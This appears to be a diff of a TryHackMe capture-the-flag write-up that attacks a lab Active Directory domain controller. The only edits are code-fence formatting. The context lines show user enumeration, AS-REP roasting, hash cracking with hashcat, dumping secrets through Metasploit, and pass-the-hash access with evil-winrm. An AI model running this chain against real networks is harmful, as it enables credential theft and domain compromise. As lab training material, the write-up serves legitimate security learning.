@@ -6,7 +6,7 @@ These notes are from a challenge I did @[tryhackme](https://tryhackme.com) calle
 
 Install [Impacket](https://github.com/SecureAuthCorp/impacket), [kerbrute](https://github.com/TarlogicSecurity/kerbrute), [evil-winrm](https://github.com/Hackplayers/evil-winrm), [Bloodhound](https://github.com/adaptivethreat/Bloodhound) and [Neo4j](https://neo4j.com/):
 
- ```sh
+ ``` sh
 sudo git clone <https://github.com/SecureAuthCorp/impacket.git> /opt/impacket
 sudo pip3 install -r /opt/impacket/requirements.txt
 cd /opt/impacket/ && sudo python3 ./setup.py install
@@ -21,7 +21,7 @@ sudo apt update && sudo apt upgrade
 Scan target with ```nmap -sC -sV 10.10.12.33```
 
 ??? output "Nmap output"
-    ```txt
+    ``` txt
     Nmap scan report for 10.10.12.33
     Host is up (0.021s latency).
     Not shown: 987 closed ports
@@ -74,7 +74,7 @@ Scan target with ```nmap -sC -sV 10.10.12.33```
 Enumerate port 139/445 with ```enum4linux -U -o 10.10.12.33```
 
 ??? output "enum4linux output"  
-    ```txt
+    ``` txt
     Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Aug 19 15:24:22 2021
 
     ==========================
@@ -133,7 +133,7 @@ Enumerate port 139/445 with ```enum4linux -U -o 10.10.12.33```
 ASREPRoasting with kerbrute and the provided userlist: ```./kerbrute -domain spookysec.local -dc-ip 10.10.12.33  -users ~/userlist.txt```
 
 ??? output "kerbrute output"
-    ```txt
+    ``` txt
     Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
 
     [*] Valid user => james
@@ -160,7 +160,7 @@ ASREPRoasting with kerbrute and the provided userlist: ```./kerbrute -domain spo
 
     GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.12.33
 
-    ```txt
+    ``` txt
     Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
 
     [*] Getting TGT for svc-admin
@@ -170,7 +170,7 @@ ASREPRoasting with kerbrute and the provided userlist: ```./kerbrute -domain spo
 We recieved a Kerberos Ticket (Kerberos 5 AS-REP etype 23, mode 18200) which we can crack using hashcat and the provided passwordlist: ```hashcat -a 0 -m 18200 ~/example.hash ~/passwordlist.txt```
 
 ??? output "hashcat output"
-    ```txt
+    ``` txt
     hashcat (v6.1.1) starting...
 
     OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
@@ -232,7 +232,7 @@ We recieved a Kerberos Ticket (Kerberos 5 AS-REP etype 23, mode 18200) which we 
 Let's enumerate any shares that the domain controller may be giving out with smbclient: ```smbclient -L \\\\10.10.12.33 -U svc-admin@spookysec.local```
 
 ??? output "smbclient user output"
-    ```txt
+    ``` txt
     Enter svc-admin@spookysec.local's password:
 
             Sharename       Type      Comment
@@ -249,7 +249,7 @@ Let's enumerate any shares that the domain controller may be giving out with smb
 Backup seems like an interesting share. Let's view it's content: ```smbclient \\\\10.10.12.33\\backup -U svc-admin@spookysec.local```
 
 ??? output "smbclient backup output"
-    ```txt
+    ``` txt
     Enter svc-admin@spookysec.local's password:
     Try "help" to get a list of possible commands.
     smb: \> dir
@@ -264,7 +264,7 @@ Backup seems like an interesting share. Let's view it's content: ```smbclient \\
 backup_credentials.txt contains some kind of hash which we can try to identify e.g. with [decodify](https://github.com/s0md3v/Decodify): ```dcode YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw```
 
 ??? output "dcode backup_credentials.txt"
-    ```txt
+    ``` txt
         __                         __
       |/  |                   | / /
       |   | ___  ___  ___  ___|  (
@@ -283,7 +283,7 @@ Running secretsdump.py didn't work for me e.g.: ```secretsdump.py spookysec.loca
 So i used metasploit with secretsdump.py und set lhost, SMBDomain, RHOSTS, SMBPass and SMBUser accordingly: ```msfconsole```
 
 ??? output "metasplot with secretsdump.py"
-    ```txt
+    ``` txt
           =[ metasploit v6.1.0-dev                           ]
     + -- --=[ 2157 exploits - 1146 auxiliary - 367 post       ]
     + -- --=[ 596 payloads - 45 encoders - 10 nops            ]
@@ -402,7 +402,7 @@ So i used metasploit with secretsdump.py und set lhost, SMBDomain, RHOSTS, SMBPa
 Secretsdump.py uses the DRSUAPI method to get NTDS.DIT secrets. We can feed evil-winrm with the hash of the adminstrator to gain access using this command: ```evil-winrm -i 10.10.12.33 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc```
 
 ??? output "evil-winrm output and flags"
-    ```txt
+    ``` txt
     Evil-WinRM shell v3.2
 
     Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
